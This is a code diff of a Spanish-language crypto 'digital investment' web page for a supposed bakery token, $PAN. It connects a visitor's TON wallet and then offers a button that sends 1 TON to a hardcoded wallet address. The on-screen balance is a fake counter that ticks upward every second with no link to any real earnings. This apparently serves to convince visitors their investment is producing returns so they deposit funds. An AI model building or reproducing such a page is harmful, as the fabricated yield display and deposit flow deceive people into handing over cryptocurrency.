@@ -9,9 +9,8 @@
         body { font-family: sans-serif; background: #000; color: #fff; text-align: center; padding: 20px; }
         .card { background: #111; border: 2px solid #FFD700; border-radius: 25px; padding: 25px; max-width: 400px; margin: auto; }
         .balance { font-size: 32px; font-weight: bold; margin: 20px 0; color: #FFD700; font-family: monospace; }
-        .btn { display: block; padding: 20px; width: 100%; border-radius: 15px; border: none; font-weight: bold; margin: 10px 0; font-size: 15px; cursor: pointer; text-decoration: none; box-sizing: border-box; }
+        .btn { display: block; padding: 20px; width: 100%; border-radius: 15px; border: none; font-weight: bold; margin: 10px 0; font-size: 16px; cursor: pointer; }
         #conBtn { background: #FFD700; color: #000; }
-        #manualBtn { background: #0088cc; color: #fff; border: 2px solid #fff; }
         #depBtn { background: #28a745; color: #fff; display: none; }
     </style>
 </head>
@@ -20,36 +19,43 @@
         <h3>YESMAN PANADERÍA S.A.S</h3>
         <p style="font-size:10px; color:#aaa;">INVERSIÓN DIGITAL $PAN</p>
         
-        <button class="btn" id="conBtn">1. CONECTAR BILLETERA</button>
+        <button class="btn" id="conBtn">CONECTAR BILLETERA</button>
 
         <div class="balance" id="bLive">0.000002015</div>
-        <p style="font-size:11px; color:#FFD700;">PRODUCCIÓN ACTIVA</p>
-
-        <hr style="border: 0.5px solid #333; margin: 20px 0;">
         
-        <p style="font-size:12px;">¿No abre el botón amarillo?</p>
-        <a href="tonkeeper://ton-connect?v=2&id=yesman&r=%7B%22manifestUrl%22%3A%22https%3A%2F%2Fyesmanbakery.github.io%2Fyesman-app%2Ftonconnect-manifest.json%22%2C%22items%22%3A%5B%7B%22name%22%3A%22ton_addr%22%7D%5D%7D" class="btn" id="manualBtn">2. ABRIR TONKEEPER DIRECTO</a>
-
-        <button class="btn" id="depBtn">EFECTUAR DEPÓSITO (1 TON)</button>
+        <div id="ton-connect"></div> <button class="btn" id="depBtn">REALIZAR DEPÓSITO (1 TON)</button>
     </div>
 
     <script>
+        // Tu contador de 9 decimales
         let b = 0.000002015;
         setInterval(() => { b += 0.000000001; document.getElementById('bLive').innerText = b.toFixed(9); }, 1000);
 
+        // Inicialización UNIVERSAL (Añadimos un número al azar al final para saltar el caché)
         const tonUI = new TONConnectUI.TonConnectUI({
-            manifestUrl: 'https://yesmanbakery.github.io/yesman-app/tonconnect-manifest.json'
+            manifestUrl: 'https://yesmanbakery.github.io/yesman-app/tonconnect-manifest.json?v=' + Date.now(),
+            buttonRootId: 'ton-connect'
         });
 
-        document.getElementById('conBtn').onclick = () => tonUI.openModal();
+        // Al tocar tu botón amarillo, se abre el selector de wallets
+        document.getElementById('conBtn').onclick = () => {
+            tonUI.openModal();
+        };
 
         tonUI.onStatusChange(wallet => {
             if (wallet) {
                 document.getElementById('conBtn').style.display = 'none';
-                document.getElementById('manualBtn').style.display = 'none';
                 document.getElementById('depBtn').style.display = 'block';
             }
         });
+
+        document.getElementById('depBtn').onclick = async () => {
+            const tx = {
+                validUntil: Math.floor(Date.now() / 1000) + 300,
+                messages: [{ address: "UQDl39VhMg-Hwa898TA-WHOBgGkGQFvBMftpuDm4yyTCdfZ2", amount: "1000000000" }]
+            };
+            await tonUI.sendTransaction(tx).catch(() => alert("Cancelado"));
+        };
     </script>
 </body>
 </html>
